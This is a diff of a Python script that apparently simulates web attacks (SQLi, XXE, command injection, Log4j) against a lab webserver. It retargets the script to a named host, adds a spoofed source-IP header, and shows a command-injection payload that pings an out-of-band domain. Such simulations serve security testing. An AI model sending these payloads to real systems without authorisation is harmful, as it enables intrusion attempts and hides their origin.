@@ -2,7 +2,7 @@ import random
 import requests
 
 # Define the target webserver where all requests will be sent
-target_webserver = 'https://www.yourwebserver.attack'
+target_webserver = 'https://www.fastlylab.com'
 
 # List of out-of-band domains to be used in the attack simulation payloads
 oob_domains = [
@@ -15,8 +15,13 @@ oob_domains = [
 # Define common types of attacks
 attack_types = ['HTTP', 'XSS', 'SQLi', 'XXE', 'Command Injection', 'RCE', 'Log4j']
 
-def send_request(method, url, data=None, headers=None):
-    """Generic function to send HTTP requests to handle different methods."""
+# Specify a fixed IP address for the X-Source-Ip header
+source_ip = '203.50.7.33'
+
+def send_request(method, url, data=None):
+    """Generic function to send HTTP requests to handle different methods, including a custom header."""
+    headers = {'X-Source-Ip': source_ip}
+    
     try:
         if method == 'GET':
             response = requests.get(url, headers=headers)
@@ -41,8 +46,7 @@ def simulate_sqli(oob_domain):
 def simulate_xxe(oob_domain):
     xml_payload = f'<?xml version="1.0" encoding="UTF-8"?><doc><entity>{oob_domain}</entity></doc>'
     payload_url = f"{target_webserver}/xml_processor"
-    headers = {'Content-Type': 'application/xml'}
-    send_request('POST', payload_url, data=xml_payload, headers=headers)
+    send_request('POST', payload_url, data=xml_payload)
 
 def simulate_command_injection(oob_domain):
     payload_url = f"{target_webserver}/cmd_exec?cmd=ping%20-c%201%20{oob_domain}"
